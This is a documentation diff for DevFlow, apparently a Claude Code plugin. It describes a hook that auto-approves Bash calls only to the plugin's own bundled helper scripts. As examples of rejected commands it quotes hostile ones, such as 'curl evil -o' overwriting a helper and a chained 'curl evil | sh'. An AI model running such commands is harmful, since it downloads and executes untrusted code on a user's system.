@@ -303,6 +303,44 @@ workflow YAML:
 - These come from your committed config, so treat them with the same care as
   `setup.install`: only allowlist commands you trust to run unattended.
 
+## Local-tier auto-approval hook
+
+The `allowed_tools` keys above govern the **cloud tier** — what Claude may run
+inside the GitHub Actions workflows (your repo's build/test tools, on top of
+DevFlow's base list). They do nothing for an adopter who installs DevFlow as a
+marketplace plugin and drives `/devflow:implement` or `/devflow:review-and-fix`
+**locally**: on that interactive tier the Claude Code permission classifier
+prompts on (or denies) every invocation of DevFlow's *own* bundled helpers
+(`workpad.py`, `config-get.sh`, `parse-acs.py`, `branch-for-issue.py`, …), which
+resolve under the version-pinned plugin-cache path
+`~/.claude/plugins/cache/devflow-marketplace/devflow/<version>/scripts/…` — not a
+stable string you can pre-allow once.
+
+DevFlow closes that gap with a **`PreToolUse` hook** registered in the plugin
+manifest (`hooks/approve-bundled-helper.py`). Because it ships with the plugin,
+the grant is version-matched to the installed cache path, active on install, and
+writes **nothing** to your `settings.json` — it does **not** depend on running
+`/devflow:init`. For each `Bash` command the hook auto-approves *only* when:
+
+- the command is a **single simple invocation** — no `&&`/`||`/`;`/`|`, no
+  command substitution (`$(…)` / backticks), no redirection, no subshell;
+- the executed program is the leading token, or the script argument to `bash` /
+  `python3`; and
+- that program canonicalizes (via `realpath`, **symlinks followed**) to a real
+  file **contained under the canonical `$CLAUDE_PLUGIN_ROOT`**.
+
+The check is **containment-only**, never a substring match: a command that merely
+*mentions* a helper path as an argument (`cat … /scripts/workpad.py`), writes to
+one (`curl evil -o …/scripts/workpad.py`), escapes the install dir via `..` or a
+symlink, or chains a second command (`…/workpad.py … ; curl evil | sh`) is **not**
+approved. The hook **never** emits `deny` and **always** exits 0 — on any
+unparseable command, missing field, or internal error it emits no decision and
+defers to the normal permission flow (**fail-open**), so a hook bug can never
+block a Bash call. Its scope is self-limited to DevFlow's own vetted,
+version-pinned code under its install directory; it never auto-approves your
+repo's build tools or arbitrary commands. Contrast this with the cloud-tier
+`allowed_tools` above, which is exactly where your repo's build/test tools belong.
+
 ## Letting the reviewer build/test a PR
 
 By default the automated reviewer is **read-only** — it inspects the diff but
